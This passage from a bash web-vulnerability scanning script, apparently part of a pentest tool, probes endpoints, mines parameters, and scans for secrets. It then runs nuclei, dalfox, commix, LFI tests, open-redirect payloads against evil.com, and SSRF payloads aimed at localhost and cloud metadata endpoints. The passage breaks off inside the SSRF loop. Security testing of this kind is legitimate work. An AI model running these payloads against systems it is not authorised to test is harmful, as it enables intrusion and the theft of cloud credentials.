# ═══════════════════════════════════════════════════════════════════════════
step3_probe() {
  _step_bar 3 6 "Endpoint Probing"
  _log "[*] STEP 3: Endpoint Probing"
  local endpoints="${OUTDIR}/all_endpoints.txt"
  [[ ! -s "$endpoints" ]] && { _warn "No endpoints to probe"; return; }
  local ep_count; ep_count=$(wc -l < "$endpoints" 2>/dev/null || echo 0)
  _spin "Probing ${ep_count} endpoints with httpx..."

  # Use PD httpx if available
  local httpx_bin=""
  [[ -f "${HOME}/go/bin/httpx" ]] && httpx_bin="${HOME}/go/bin/httpx"
  [[ -z "$httpx_bin" ]] && command -v httpx &>/dev/null && httpx_bin="httpx"

  if [[ -n "$httpx_bin" ]] && "$httpx_bin" -version 2>&1 | grep -qi 'projectdiscovery\|current' 2>/dev/null; then
    _tool_cmd "httpx" "httpx -silent -status-code -title -content-length -tech-detect -json -threads $THREADS"
    "$httpx_bin" -silent -status-code -title -content-length -tech-detect \
      -json -threads "$THREADS" -follow-redirects -timeout "$REQ_TIMEOUT" \
      < "$endpoints" > "${OUTDIR}/probed.json" 2>/dev/null || true
  else
    # Fallback: curl-based probing
    _log "  PD httpx not available, using curl probe"
    : > "${OUTDIR}/probed.json"
    while IFS= read -r url; do
      local result
      result=$(_curl "$url" -o /dev/null -w '{"url":"%{url_effective}","status_code":%{http_code},"content_length":%{size_download},"time_total":%{time_total}}' 2>/dev/null) || continue
      echo "$result" >> "${OUTDIR}/probed.json"
    done < <(head -500 "$endpoints")
  fi

  _spin_stop
  # ── Deduplicate by response content-length ──
  # Servers with try_files return the same page for every path.
  # Detect the baseline (most common content_length) and filter duplicates.
  _log "  Deduplicating probe results..."
  local baseline_cl=""
  baseline_cl=$(jq -r 'select(.status_code == 200) | .content_length // .content_length_header // 0' \
    "${OUTDIR}/probed.json" 2>/dev/null | sort | uniq -c | sort -rn | head -1 | awk '{print $2}') || true

  if [[ -n "$baseline_cl" ]] && [[ "$baseline_cl" -gt 0 ]]; then
    local total_200; total_200=$(jq -r 'select(.status_code == 200) | .url' "${OUTDIR}/probed.json" 2>/dev/null | wc -l || echo 0)
    local matching_bl; matching_bl=$(jq -r "select(.status_code == 200 and (.content_length // .content_length_header // 0) == $baseline_cl) | .url" \
      "${OUTDIR}/probed.json" 2>/dev/null | wc -l || echo 0)
    # If >70% of 200 responses have the same content_length, it's a catch-all
    if [[ "$total_200" -gt 10 ]] && [[ $(( matching_bl * 100 / (total_200 + 1) )) -gt 70 ]]; then
      _log "  Detected catch-all response (size=${baseline_cl}): filtering ${matching_bl} duplicates"
      # Keep only responses with DIFFERENT content_length (real pages)
      jq -c "select(.status_code != 200 or (.content_length // .content_length_header // 0) != $baseline_cl)" \
        "${OUTDIR}/probed.json" > "${OUTDIR}/probed_deduped.json" 2>/dev/null || true
      mv "${OUTDIR}/probed_deduped.json" "${OUTDIR}/probed.json"
    fi
  fi

  # Extract categorized URL lists
  jq -r 'select(.status_code != null and .status_code != 404) | .url // empty' \
    "${OUTDIR}/probed.json" 2>/dev/null | sort -u > "${OUTDIR}/probed_urls.txt" || true

  jq -r 'select(.status_code == 401 or .status_code == 403) | .url // empty' \
    "${OUTDIR}/probed.json" 2>/dev/null > "${OUTDIR}/access_control.txt" || true

  jq -r 'select(.status_code >= 500) | .url // empty' \
    "${OUTDIR}/probed.json" 2>/dev/null > "${OUTDIR}/error_pages.txt" || true

  jq -r 'select(.status_code == 301 or .status_code == 302) | .url // empty' \
    "${OUTDIR}/probed.json" 2>/dev/null > "${OUTDIR}/redirects.txt" || true

  local live; live=$(wc -l < "${OUTDIR}/probed_urls.txt" 2>/dev/null || echo 0)
  local acl; acl=$(wc -l < "${OUTDIR}/access_control.txt" 2>/dev/null || echo 0)
  local errs; errs=$(wc -l < "${OUTDIR}/error_pages.txt" 2>/dev/null || echo 0)

  _ok "Probed: $live live | $acl access-controlled | $errs error pages"
  _save_state "probe"
}

# ═══════════════════════════════════════════════════════════════════════════
#  STEP 4: PARAMETER DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════
step4_params() {
  _step_bar 4 6 "Parameter Discovery"
  _log "[*] STEP 4: Deep Parameter Discovery"
  local probed="${OUTDIR}/probed_urls.txt"
  [[ ! -s "$probed" ]] && { _warn "No live endpoints for param discovery"; return; }
  _spin "Mining parameters from 6 sources (HTML, JS, Arjun, historical, wordlist, crawl)..."

  # Use Phase 3 mine_params() if available (with 4-min timeout)
  if declare -f mine_params &>/dev/null; then
    ( mine_params "${OUTDIR}/probed_urls.txt" "$OUTDIR" || true ) &
    local mp_pid=$!
    local mp_deadline=$(( $(date +%s) + 600 ))  # 10-min for thorough param mining
    local _last_param_count=0
    while kill -0 "$mp_pid" 2>/dev/null; do
      if [[ $(date +%s) -ge $mp_deadline ]]; then
        _debug "Param mining deadline reached, killing process tree"
        _kill_tree_hard "$mp_pid"
        break
      fi
      # Real-time: show new params as they're discovered
      local _live_count
      _live_count=$(cat "${OUTDIR}"/params_*.txt 2>/dev/null | grep -c '|' || true)
      _live_count="${_live_count:-0}"
      if [[ "$_live_count" -gt "$_last_param_count" ]]; then
        local _new_lines
        _new_lines=$(( _live_count - _last_param_count ))
        _spin_stop
        # Show newly discovered params
        cat "${OUTDIR}"/params_*.txt 2>/dev/null | grep '|' | sort -t'|' -k1,2 -u | \
          tail -n "$_new_lines" | while IFS='|' read -r _purl _pparam _psrc _pmethod _pnote; do
            [[ -z "$_pparam" ]] && continue
            local _short="${_purl#http*://}"
            [[ ${#_short} -gt 40 ]] && _short="${_short:0:37}..."
            printf '  \033[1;32m  [+] PARAM\033[0m %-42s \033[1;33m%-15s\033[0m %s (%s)\n' "$_short" "$_pparam" "${_pmethod:-GET}" "$_psrc" >&2
          done
        _last_param_count=$_live_count
        _spin "Mining parameters... (${_live_count} found so far)"
      fi
      sleep 2
    done
    wait "$mp_pid" 2>/dev/null || true
    _spin_stop

    # Merge partial results (mine_params may have been killed before its merge step)
    local current_count
    current_count=$(wc -l < "${OUTDIR}/active_params.txt" 2>/dev/null || echo 0)
    if [[ "$current_count" -eq 0 ]]; then
      _debug "Merging partial param results after deadline"
      if declare -f _merge_and_score_params &>/dev/null; then
        _merge_and_score_params "$OUTDIR" 2>/dev/null || true
      else
        # Inline merge fallback
        cat "${OUTDIR}"/params_*.txt 2>/dev/null | \
          sort -t'|' -k1,2 -u > "${OUTDIR}/active_params.txt" 2>/dev/null || true
      fi
    fi

    # Tag LFI/redirect candidates (always, in case merge just ran)
    local lfi_kw='file\|path\|page\|include\|template\|doc\|folder\|view\|load\|read\|dir\|resource\|filename\|download\|src\|conf\|log\|url\|action\|cat\|type\|content\|prefix\|require\|pg\|document\|root\|data\|board\|date\|detail\|inc\|locate\|show\|layout\|mod\|site\|img\|open\|nav\|import'
    local lfi_short='^p$\|^f$\|^fn$\|^fp$\|^loc$\|^uri$\|^val$'
    {
      grep -i "$lfi_kw" "${OUTDIR}/active_params.txt" 2>/dev/null || true
      awk -F'|' '{print tolower($2)}' "${OUTDIR}/active_params.txt" 2>/dev/null | \
        grep -n "$lfi_short" 2>/dev/null | cut -d: -f1 | \
        while IFS= read -r ln; do sed -n "${ln}p" "${OUTDIR}/active_params.txt"; done 2>/dev/null || true
    } | sort -u > "${OUTDIR}/lfi_candidates.txt" 2>/dev/null || true

    local redir_kw='redirect\|redir\|next\|return\|goto\|url\|callback\|continue\|dest\|destination\|target\|rurl\|forward\|out\|link\|jump'
    grep -i "$redir_kw" "${OUTDIR}/active_params.txt" 2>/dev/null | \
      sort -u > "${OUTDIR}/redirect_candidates.txt" 2>/dev/null || true

    local total; total=$(wc -l < "${OUTDIR}/active_params.txt" 2>/dev/null || echo 0)
    local lfi_c; lfi_c=$(wc -l < "${OUTDIR}/lfi_candidates.txt" 2>/dev/null || echo 0)
    local redir_c; redir_c=$(wc -l < "${OUTDIR}/redirect_candidates.txt" 2>/dev/null || echo 0)
    _ok "Parameters discovered: $total | LFI-candidates: $lfi_c | Redirect-candidates: $redir_c"

    # Display parameter summary table
    if [[ "$total" -gt 0 ]]; then
      printf '\n' >&2
      printf '  \033[1;36m%-50s %-15s %-8s %s\033[0m\n' "ENDPOINT" "PARAM" "METHOD" "SOURCE" >&2
      printf '  \033[2m%-50s %-15s %-8s %s\033[0m\n' "$(printf '%.0s─' {1..50})" "$(printf '%.0s─' {1..15})" "$(printf '%.0s─' {1..8})" "$(printf '%.0s─' {1..10})" >&2
      while IFS='|' read -r p_url p_param p_source p_method _; do
        local short_url="${p_url#http*://}"
        [[ ${#short_url} -gt 48 ]] && short_url="${short_url:0:45}..."
        local tag=""
        echo "$p_param" | grep -qiE 'file|path|page|include|template|doc|load|read|dir|resource' && tag=$' \033[1;31m[LFI?]\033[0m'
        echo "$p_param" | grep -qiE 'redirect|redir|next|return|goto|callback|dest|url' && tag=$' \033[1;33m[REDIR?]\033[0m'
        printf '  %-50s \033[1;32m%-15s\033[0m %-8s %s%b\n' "$short_url" "$p_param" "${p_method:-GET}" "${p_source:-unknown}" "$tag" >&2
      done < <(head -20 "${OUTDIR}/active_params.txt")
      [[ "$total" -gt 20 ]] && printf '  \033[2m... and %d more (see active_params.txt)\033[0m\n' "$((total - 20))" >&2
      printf '\n' >&2
    fi

    _json_event "params_complete" "{\"total\":$total,\"lfi\":$lfi_c,\"redirect\":$redir_c}"
    _save_state "params"
    return
  fi

  # Fallback: inline implementation

  local pids=()

  # ── SOURCE 1: Arjun ──
  if command -v arjun &>/dev/null; then
    _debug "Launching arjun"
    (
      : > "${OUTDIR}/params_arjun.txt"
      # Prioritize .php/.asp pages, limit to 5 targets to save time
      { grep -iE '\.(php|asp|aspx|jsp|do|action|cgi)(\?|$)' "$probed" 2>/dev/null; head -5 "$probed"; } | sort -u | head -5 | while IFS= read -r url; do
        local result; result=$(timeout 60 arjun -u "$url" -t 10 --stable 2>/dev/null) || continue  # stdout captured in $result
        # Parse arjun output → our format
        echo "$result" | grep -oP 'http[^\s]+' | while IFS= read -r found; do
          # Extract params from arjun discovered URLs
          if [[ "$found" == *"?"* ]]; then
            echo "${found%%\?*}" | while IFS= read -r base; do
              echo "${found#*\?}" | tr '&' '\n' | cut -d= -f1 | while IFS= read -r p; do
                [[ -n "$p" ]] && echo "${base}|${p}|arjun|GET|brute"
              done
            done
          fi
        done >> "${OUTDIR}/params_arjun.txt" 2>/dev/null
      done
    ) &
    pids+=($!)
  fi

  # ── SOURCE 2: HTML form + hidden field extraction ──
  (
    _debug "Extracting HTML form params"
    : > "${OUTDIR}/params_html.txt"
    while IFS= read -r url; do
      local body; body=$(_curl "$url" 2>/dev/null) || continue

      # All <input name="..."> (excluding type="file" which is upload, not LFI)
      echo "$body" | grep -oiP '<input\b[^>]+>' | grep -viP 'type\s*=\s*["\x27]file["\x27]' | \
        grep -oiP 'name\s*=\s*["\x27]\K[^"\x27]+' | while IFS= read -r p; do
          echo "${url}|${p}|html_input|GET|form"
        done

      # Hidden inputs specifically tagged
      echo "$body" | grep -oiP '<input\b[^>]*type\s*=\s*["\x27]hidden["\x27][^>]*name\s*=\s*["\x27]([^"\x27]+)' | \
        grep -oiP 'name\s*=\s*["\x27]\K[^"\x27]+' | while IFS= read -r p; do
          echo "${url}|${p}|hidden_field|POST|hidden"
        done
      # Reverse order: name before type
      echo "$body" | grep -oiP '<input\b[^>]*name\s*=\s*["\x27]([^"\x27]+)["\x27][^>]*type\s*=\s*["\x27]hidden["\x27]' | \
        grep -oiP 'name\s*=\s*["\x27]\K[^"\x27]+' | while IFS= read -r p; do
          echo "${url}|${p}|hidden_field|POST|hidden"
        done

      # <select>, <textarea>
      echo "$body" | grep -oiP '<(?:select|textarea)\b[^>]*\bname\s*=\s*["\x27]([^"\x27]+)' | \
        grep -oiP 'name\s*=\s*["\x27]\K[^"\x27]+' | while IFS= read -r p; do
          echo "${url}|${p}|html_form|POST|extracted"
        done

      # data-param, data-field, data-name attributes
      echo "$body" | grep -oiP 'data-(?:param|field|name|key)\s*=\s*["\x27]([^"\x27]+)' | \
        grep -oiP '=\s*["\x27]\K[^"\x27]+' | while IFS= read -r p; do
          echo "${url}|${p}|data_attr|GET|data_attribute"
        done

      # <form action="..."> → discover new endpoints
      echo "$body" | grep -oiP '<form\b[^>]*action\s*=\s*["\x27]([^"\x27]+)' | \
        grep -oiP 'action\s*=\s*["\x27]\K[^"\x27]+' | while IFS= read -r path; do
          if [[ "$path" == /* ]]; then
            echo "${TARGET}${path}" >> "${OUTDIR}/all_endpoints.txt"
          elif [[ "$path" == http* ]]; then
            echo "$path" >> "${OUTDIR}/all_endpoints.txt"
          fi
        done
    done < <(head -30 "$probed") > "${OUTDIR}/params_html.txt" 2>/dev/null || true
  ) &
  pids+=($!)

  # ── SOURCE 3: JS static analysis ──
  (
    _debug "Analyzing JavaScript files for params + API endpoints"
    : > "${OUTDIR}/params_js.txt"
    # Collect JS URLs
    grep -hiE '\.js(\?|$|#)' "${OUTDIR}/all_endpoints.txt" 2>/dev/null | \
      grep -v '\.json' | sort -u | head -100 | \
    while IFS= read -r js_url; do
      local js; js=$(_curl "$js_url" 2>/dev/null) || continue

      # Save JS for secret scanning later
      local safe_name; safe_name=$(echo "$js_url" | md5sum | cut -c1-16)
      echo "$js" > "${OUTDIR}/responses/js_${safe_name}.txt"

      # fetch/axios/XHR URL patterns → extract API endpoints + params
      # shellcheck disable=SC2016
      echo "$js" | grep -oP '(?:fetch|axios[^(]*|\.open)\s*\(\s*["\x27`]([^"\x27`]+)' | \
        grep -oP '["\x27`]\K[^"\x27`]+' | while IFS= read -r path; do
          # New endpoint
          if [[ "$path" == /* ]]; then
            echo "${TARGET}${path}" >> "${OUTDIR}/all_endpoints.txt"
          fi
          # Extract query params from URL
          if [[ "$path" == *"?"* ]]; then
            local base="${path%%\?*}"
            echo "${path#*\?}" | tr '&' '\n' | cut -d= -f1 | while IFS= read -r p; do
              [[ -n "$p" ]] && echo "${TARGET}${base}|${p}|js_fetch|GET|js_extracted"
            done
          fi
        done

      # URLSearchParams.append('key', ...)
      echo "$js" | grep -oP "(?:URLSearchParams|searchParams|params).*?(?:append|set)\s*\(\s*['\"](\w+)" | \
        grep -oP "['\"](\w+)['\"]" | tr -d "\"'" | sort -u | while IFS= read -r p; do
          [[ -n "$p" ]] && echo "${js_url}|${p}|js_urlsearchparams|GET|js_extracted"
        done

      # JSON body keys near request calls: {key: ..., key2: ...}
      echo "$js" | grep -oP '(?:body|data|params|payload)\s*[:=]\s*\{[^}]{1,500}\}' | \
        grep -oP '"(\w+)"\s*:' | sed 's/"//g; s/\s*://' | sort -u | while IFS= read -r p; do
          [[ -n "$p" ]] && echo "${js_url}|${p}|js_body_key|POST|js_extracted"
        done

      # GraphQL query fields
      echo "$js" | grep -oP 'query\s*[{(].*?[})]' | grep -oP '\b(\w+)\s*[({]' | \
        sed 's/[({]//' | sort -u | while IFS= read -r p; do
          [[ -n "$p" ]] && [[ ${#p} -gt 2 ]] && echo "${js_url}|${p}|js_graphql|POST|graphql_field"
        done

    done > "${OUTDIR}/params_js.txt" 2>/dev/null || true
  ) &
  pids+=($!)

  # ── SOURCE 4: Historical params (gau/wayback) ──
  (
    _debug "Mining historical params"
    {
      cat "${OUTDIR}/crawl/gau.txt" 2>/dev/null
      cat "${OUTDIR}/crawl/wayback.txt" 2>/dev/null
    } | grep '?' | while IFS= read -r hist_url; do
      local base="${hist_url%%\?*}"
      echo "${hist_url#*\?}" | tr '&' '\n' | cut -d= -f1 | while IFS= read -r p; do
        [[ -n "$p" ]] && [[ ${#p} -lt 50 ]] && echo "${base}|${p}|historical|GET|archive"
      done
    done | sort -t'|' -k1,2 -u > "${OUTDIR}/params_historical.txt" 2>/dev/null || true
  ) &
  pids+=($!)

  # ── SOURCE 5: Burp request params ──
  if [[ -n "$REQUEST_FILE" ]] && [[ ${#BURP_PARAMS[@]} -gt 0 ]]; then
    export_params_to_file "${OUTDIR}/params_burp.txt"
  fi

  # Wait for all param sources with master deadline (4 minutes max)
  local param_deadline=$(( $(date +%s) + 240 ))
  _log "  Waiting for ${#pids[@]} param discovery sources (max 4 min)..."
  for pid in "${pids[@]}"; do
    while kill -0 "$pid" 2>/dev/null; do
      if [[ $(date +%s) -ge $param_deadline ]]; then
        _debug "Param deadline reached, killing remaining sources"
        for kpid in "${pids[@]}"; do _kill_tree_hard "$kpid"; done
        break 2
      fi
      sleep 1
    done
    wait "$pid" 2>/dev/null || true
  done

  # ── MERGE + DEDUPE ──
  _log "  Merging parameters..."
  cat "${OUTDIR}"/params_*.txt 2>/dev/null | \
    sort -t'|' -k1,2 -u > "${OUTDIR}/active_params.txt" 2>/dev/null || true

  # Tag LFI candidate params (file/path operation names)
  local lfi_keywords='file\|path\|page\|include\|template\|doc\|folder\|view\|load\|read\|dir\|resource\|filename\|download\|src\|conf\|log\|url\|action\|cat\|type\|content\|prefix\|require\|pg\|document\|root\|data\|board\|date\|detail\|inc\|locate\|show\|layout\|mod\|site\|img\|open\|nav\|import'
  grep -i "$lfi_keywords" "${OUTDIR}/active_params.txt" 2>/dev/null | \
    sort -u > "${OUTDIR}/lfi_candidates.txt" 2>/dev/null || true

  # Tag open redirect candidate params
  local redir_keywords='redirect\|redir\|next\|return\|goto\|url\|callback\|continue\|dest\|destination\|target\|rurl\|forward\|out\|link\|jump'
  grep -i "$redir_keywords" "${OUTDIR}/active_params.txt" 2>/dev/null | \
    sort -u > "${OUTDIR}/redirect_candidates.txt" 2>/dev/null || true

  local total; total=$(wc -l < "${OUTDIR}/active_params.txt" 2>/dev/null || echo 0)
  local lfi_c; lfi_c=$(wc -l < "${OUTDIR}/lfi_candidates.txt" 2>/dev/null || echo 0)
  local redir_c; redir_c=$(wc -l < "${OUTDIR}/redirect_candidates.txt" 2>/dev/null || echo 0)

  _spin_stop
  _ok "Parameters discovered: $total | LFI-candidates: $lfi_c | Redirect-candidates: $redir_c"

  # Display parameter summary table
  if [[ "$total" -gt 0 ]]; then
    printf '\n' >&2
    printf '  \033[1;36m%-50s %-15s %-8s %s\033[0m\n' "ENDPOINT" "PARAM" "METHOD" "SOURCE" >&2
    printf '  \033[2m%-50s %-15s %-8s %s\033[0m\n' "$(printf '%.0s─' {1..50})" "$(printf '%.0s─' {1..15})" "$(printf '%.0s─' {1..8})" "$(printf '%.0s─' {1..10})" >&2
    while IFS='|' read -r url param source method _ _; do
      local short_url="${url#http*://}"
      [[ ${#short_url} -gt 48 ]] && short_url="${short_url:0:45}..."
      local tag=""
      # Highlight LFI/redirect candidates
      echo "$param" | grep -qiE 'file|path|page|include|template|doc|load|read|dir|resource' && tag=$' \033[1;31m[LFI?]\033[0m'
      echo "$param" | grep -qiE 'redirect|redir|next|return|goto|callback|dest|url' && tag=$' \033[1;33m[REDIR?]\033[0m'
      printf '  %-50s \033[1;32m%-15s\033[0m %-8s %s%b\n' "$short_url" "$param" "${method:-GET}" "${source:-unknown}" "$tag" >&2
    done < <(head -20 "${OUTDIR}/active_params.txt")
    [[ "$total" -gt 20 ]] && printf '  \033[2m... and %d more (see active_params.txt)\033[0m\n' "$((total - 20))" >&2
    printf '\n' >&2
  fi

  _json_event "params_complete" "{\"total\":$total,\"lfi\":$lfi_c,\"redirect\":$redir_c}"
  _save_state "params"
}

# ═══════════════════════════════════════════════════════════════════════════
#  STEP 4.5: SECRET SCANNING
# ═══════════════════════════════════════════════════════════════════════════
step4_5_secrets() {
  _log "[*] STEP 4.5: Secret Scanning"

  # Use Phase 3 scan_secrets() if available
  if declare -f scan_secrets &>/dev/null; then
    mkdir -p "${OUTDIR}/responses"
    local count; count=$(scan_secrets "$OUTDIR" 2>/dev/null) || count=0
    if [[ "$count" -gt 0 ]]; then
      _ok "Secrets found: $count (see ${OUTDIR}/secrets.json)"
    else
      _ok "No secrets detected"
    fi
    _save_state "secrets"
    return
  fi

  # Fallback: inline implementation
  local patterns_file="${TRAKTR_ROOT}/payloads/secrets/patterns.txt"
  [[ ! -f "$patterns_file" ]] && { _warn "Secret patterns not found, skipping"; return; }

  local secrets_found=0
  local secrets_file="${OUTDIR}/secrets.json"
  : > "$secrets_file"

  # Fetch JS files for scanning (if not already fetched in step 4)
  grep -hiE '\.js(\?|$)' "${OUTDIR}/all_endpoints.txt" 2>/dev/null | \
    grep -v '\.json' | sort -u | head -50 | while IFS= read -r js_url; do
      local safe; safe=$(echo "$js_url" | md5sum | cut -c1-16)
      [[ -f "${OUTDIR}/responses/js_${safe}.txt" ]] && continue
      _curl "$js_url" > "${OUTDIR}/responses/js_${safe}.txt" 2>/dev/null || true
    done

  # Also fetch error pages (they leak stack traces + config)
  if [[ -s "${OUTDIR}/error_pages.txt" ]]; then
    head -20 "${OUTDIR}/error_pages.txt" | while IFS= read -r err_url; do
      local safe; safe=$(echo "$err_url" | md5sum | cut -c1-16)
      _curl "$err_url" > "${OUTDIR}/responses/err_${safe}.txt" 2>/dev/null || true
    done
  fi

  # Scan all response files against patterns
  local tmpfindings; tmpfindings=$(mktemp)
  while IFS=$'\t' read -r label pattern confidence; do
    # Skip comments and empty lines
    [[ "$label" == \#* ]] || [[ -z "$label" ]] && continue

    for resp_file in "${OUTDIR}"/responses/*.txt "${OUTDIR}"/responses/*.html; do
      [[ -f "$resp_file" ]] || continue
      local matches
      matches=$(grep -oP -- "$pattern" "$resp_file" 2>/dev/null | head -5) || continue
      [[ -z "$matches" ]] && continue

      while IFS= read -r match; do
        # False positive filter
        echo "$match" | grep -qiE 'example|test_|placeholder|xxxx|your.*(key|token|here)|sample|dummy|changeme' && continue

        local redacted
        if [[ ${#match} -gt 16 ]]; then
          redacted="${match:0:8}...${match: -4}"
        else
          redacted="****"
        fi

        echo "{\"type\":\"${label}\",\"value_redacted\":\"${redacted}\",\"location\":\"$(basename "$resp_file")\",\"confidence\":\"${confidence}\"}" >> "$tmpfindings"
        ((secrets_found++)) || true

        # Immediate terminal alert for confirmed secrets
        if [[ "$confidence" == "CONFIRMED" ]]; then
          echo -e "\033[1;31m  [!!!] SECRET: ${label} = ${redacted} in $(basename "$resp_file") [${confidence}]\033[0m" >&2
        fi

        _json_event "secret_found" "{\"type\":\"${label}\",\"confidence\":\"${confidence}\"}"
      done <<< "$matches"
    done
  done < "$patterns_file"

  # Build proper JSON array
  if [[ -s "$tmpfindings" ]]; then
    jq -s '.' "$tmpfindings" > "$secrets_file" 2>/dev/null || \
      { echo "["; sed 's/$/,/' "$tmpfindings" | sed '$ s/,$//' ; echo "]"; } > "$secrets_file"
  else
    echo "[]" > "$secrets_file"
  fi
  rm -f "$tmpfindings"

  if [[ $secrets_found -gt 0 ]]; then
    _ok "Secrets found: $secrets_found (see ${OUTDIR}/secrets.json)"
  else
    _ok "No secrets detected"
  fi

  _save_state "secrets"
}

# ═══════════════════════════════════════════════════════════════════════════
#  STEP 5: VULNERABILITY TESTING
# ═══════════════════════════════════════════════════════════════════════════
step5_vuln_test() {
  _step_bar 5 6 "Vulnerability Testing"
  _log "[*] STEP 5: Vulnerability Testing (threads: $THREADS)"
  local probed="${OUTDIR}/probed_urls.txt"
  [[ ! -s "$probed" ]] && { _warn "No probed URLs for vuln testing"; return; }

  mkdir -p "${OUTDIR}/vuln"
  local pids=()

  # ── NUCLEI ──
  if command -v nuclei &>/dev/null && [[ "$SKIP_NUCLEI" != true ]]; then
    _tool_cmd "nuclei" "nuclei -l probed_urls.txt -severity medium,high,critical -jsonl -c $THREADS"
    local sev="medium,high,critical"
    [[ "$AGGRESSIVE" == true ]] && sev="low,medium,high,critical"
    local nuclei_rate=()
    [[ "$RATE_LIMIT" -gt 0 ]] && nuclei_rate+=(-rate-limit "$RATE_LIMIT")
    (
      nuclei -l "$probed" -severity "$sev" -jsonl -silent \
        -c "$THREADS" "${nuclei_rate[@]+"${nuclei_rate[@]}"}" \
        -o "${OUTDIR}/vuln/nuclei.json" 2>/dev/null || true
    ) &
    pids+=($!)
  fi

  # ── LFI ENGINE ──
  if [[ "$SKIP_LFI" != true ]] && [[ -s "${OUTDIR}/lfi_candidates.txt" ]]; then
    local lfi_count; lfi_count=$(wc -l < "${OUTDIR}/lfi_candidates.txt")
    _tool_cmd "lfi-engine" "LFI escalation (${lfi_count} candidates)"
    (
      if declare -f detect_lfi &>/dev/null; then
        # Full 6-level LFI engine with auto-read
        # stdout → JSON file, stderr → terminal (for auto-read display)
        while IFS='|' read -r url param source method _; do
          [[ -z "$url" ]] || [[ -z "$param" ]] && continue
          detect_lfi "$url" "$param" "${method:-GET}"
        done < "${OUTDIR}/lfi_candidates.txt" > "${OUTDIR}/vuln/lfi.json" || true
      else
        _lfi_basic_test > "${OUTDIR}/vuln/lfi.json"
      fi
    ) &
    pids+=($!)
  fi

  # ── XSS (dalfox) ──
  if command -v dalfox &>/dev/null && [[ -s "${OUTDIR}/active_params.txt" ]]; then
    _tool_cmd "dalfox" "dalfox pipe --silence (XSS scan on active params)"
    local dalfox_flags=()
    [[ "$OSCP" == true ]] && dalfox_flags+=(--skip-bav)
    (
      # Build URLs with param placeholders (strip existing query params from base URL)
      awk -F'|' '{split($1,a,"?"); if($2!="") print a[1] "?" $2 "=FUZZ"}' "${OUTDIR}/active_params.txt" | \
        sort -u | head -200 | \
        dalfox pipe --silence "${dalfox_flags[@]+"${dalfox_flags[@]}"}" \
        -o "${OUTDIR}/vuln/xss.txt" 2>/dev/null || true
    ) &
    pids+=($!)
  fi

  # ── Command Injection (commix) ──
  if command -v commix &>/dev/null && [[ -s "${OUTDIR}/active_params.txt" ]]; then
    local clevel=3
    [[ "$OSCP" == true ]] && clevel=1
    # Limit to 5 unique base URLs to avoid banner spam and wasted time
    local commix_targets; commix_targets=$(mktemp)
    awk -F'|' '{base=$1; sub(/\?.*/, "", base); print base "|" $2}' "${OUTDIR}/active_params.txt" | \
      sort -u | head -5 > "$commix_targets"
    local commix_count; commix_count=$(wc -l < "$commix_targets")
    _tool_cmd "commix" "commix --batch --level ${clevel} (${commix_count} targets)"
    (
      while IFS='|' read -r base_url param; do
        [[ -z "$base_url" ]] || [[ -z "$param" ]] && continue
        local tgt="${base_url}?${param}=test"
        timeout 45 commix --batch --level "$clevel" -u "$tgt" \
          --output-dir="${OUTDIR}/vuln/commix_out" --no-logging \
          </dev/null >/dev/null 2>&1 || true
      done < "$commix_targets"
      rm -f "$commix_targets"
    ) &
    pids+=($!)
  fi

  # ── Open Redirect ──
  if [[ -s "${OUTDIR}/redirect_candidates.txt" ]]; then
    _debug "Testing open redirects"
    (
      : > "${OUTDIR}/vuln/redirects.json"
      local payloads=("https://evil.com" "//evil.com" "/\\\\evil.com" "//evil%00.com" "https:evil.com")
      while IFS='|' read -r url param _ method _; do
        [[ -z "$url" ]] || [[ -z "$param" ]] && continue
        for payload in "${payloads[@]}"; do
          local encoded; encoded=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
          local redir
          redir=$(_curl "${url}?${param}=${encoded}" -o /dev/null -w '%{redirect_url}' -L --max-redirs 1 2>/dev/null) || continue
          if echo "$redir" | grep -qi 'evil\.com'; then
            local prefix=""; [[ "$OSCP" == true ]] && prefix="POTENTIAL "
            echo "{\"type\":\"${prefix}open_redirect\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"$payload\",\"confidence\":\"HIGH\",\"curl\":\"curl -skI '${url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/redirects.json"
            echo -e "\033[1;33m  [!!] Open Redirect: ${url} (${param}) [HIGH]\033[0m" >&2
            break  # One confirmed is enough per param
          fi
        done
      done < <(head -30 "${OUTDIR}/redirect_candidates.txt")
    ) &
    pids+=($!)
  fi

  # ── SSRF Detection ──
  if [[ -s "${OUTDIR}/active_params.txt" ]]; then
    local ssrf_keywords='url|uri|href|src|dest|redirect|link|fetch|proxy|target|site|domain|host|callback|api_url|endpoint|webhook|feed|resource|img|image|load|open'
    local ssrf_candidates; ssrf_candidates=$(mktemp)
    grep -iE "${ssrf_keywords}" "${OUTDIR}/active_params.txt" > "$ssrf_candidates" 2>/dev/null || true
    if [[ -s "$ssrf_candidates" ]]; then
      _tool_cmd "ssrf-detect" "SSRF testing ($(wc -l < "$ssrf_candidates") candidates)"
      (
        : > "${OUTDIR}/vuln/ssrf.json"
        # Comprehensive SSRF payloads: localhost variants, IPv6, decimal, octal, cloud metadata
        local ssrf_payloads=(
          "http://127.0.0.1"
          "http://localhost"
          "http://[::1]"
          "http://0x7f000001"
          "http://2130706433"
          "http://127.1"
          "http://0177.0.0.1"
          "http://0"
          "http://0.0.0.0"
          "http://[0:0:0:0:0:ffff:127.0.0.1]"
          "http://[::ffff:127.0.0.1]"
          "http://127.127.127.127"
          "http://0x7f.0x0.0x0.0x1"
        )
        local ssrf_meta_payloads=(
          "http://169.254.169.254/latest/meta-data/"
          "http://169.254.169.254/latest/user-data"
          "http://metadata.google.internal/computeMetadata/v1/"
          "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
          "http://100.100.100.200/latest/meta-data/"
        )
        # Content signatures for SSRF confirmation
        local ssrf_sigs='ami-id|instance-id|local-ipv4|computeMetadata|169\.254\.169\.254|metadata|compute\.internal|localhost|127\.0\.0\.1|0\.0\.0\.0|privateIp|<title>|<html|connection refused|ECONNREFUSED'
        while IFS='|' read -r url param _ method _; do
          [[ -z "$url" ]] || [[ -z "$param" ]] && continue
          local base_url="${url%%\?*}"
          local found_ssrf=false
          # Get baseline
          local bl_file; bl_file=$(mktemp "${OUTDIR}/ssrf_bl_XXXXX")
          _curl "${base_url}?${param}=http://traktr-canary-nonexistent.invalid" -o "$bl_file" 2>/dev/null || { rm -f "$bl_file"; continue; }
          local bl_size; bl_size=$(wc -c < "$bl_file" 2>/dev/null || echo 0)
